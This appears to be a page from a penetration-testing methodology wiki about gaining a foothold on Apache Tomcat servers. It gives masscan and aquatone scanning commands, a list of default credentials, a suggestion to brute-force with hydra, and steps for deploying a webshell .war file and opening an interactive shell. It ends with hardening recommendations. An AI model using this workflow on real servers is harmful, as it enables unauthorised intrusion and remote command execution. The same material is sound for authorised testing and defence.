---
layout: default
title: Apache Tomcat
parent: Web Applications
nav_order: 2
permalink: /webapps/tomcat/
---

# Apache Tomcat
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Apache Tomcat is a web server that allows to depoy and host Java applications. Administrators connect on the Tomcat's manager panel to configure applications. This administration page is protected by an authentication form. Nevertheless, default credentials are often in use. You can then take advantage of this administration access to deploy a reverse shell on the Apache Tomcat server and then get an initial foothold.

## Prerequisites

- Target must be an Apache Tomcat server with manager panel activated, protected with default credentials.

## Exploit

First, you need to identify Apache Tomcat servers on the network with manager panel activated. To do so, you can use the powerful combinaison of `masscan` and `aquatone`.

```bash
# Scan the network.
sudo masscan $RANGE -p80,443,8080,8443 -oX out.xml

# Take screenshots of up services.
cat out.xml | aquatone -nmap -out ./aquatone

# Browse results and find tomcat servers.
feh ./aquatone/screenshots
```

If you find an Apache Tomcat instance, you should try to access `$TARGET:$PORT/manager` in your favorite web browser. If an authentication appears, bingo! Let's try following default credentials.

```bash
# Try combinaisions with these words as username and password.
tomcat
role1
admin
root
```

You can also use `hydra` to brute force the authentication if default credentials did not work.

Once authenticated on the manager panel, you are now able to deploy `.war` files. We can take advantage of this feature by deploying a webshell on the server, getting an initial foothold on it.

To do so, use this [GitHub repository](https://github.com/p0dalirius/Tomcat-webshell-application). When to webshell is deployed, you can use `console.py` script to get an interactive shell.

```bash
# Get an interactive shell.
./console.py -t $TARGET:$PORT

# Check which user is running Tomcat server.
whoami
```

## Recommendations

- [ ] Modify default credentials for Apache Tomcat manager panel to enforce strong password.
- [ ] In the best case, disable the manager panel.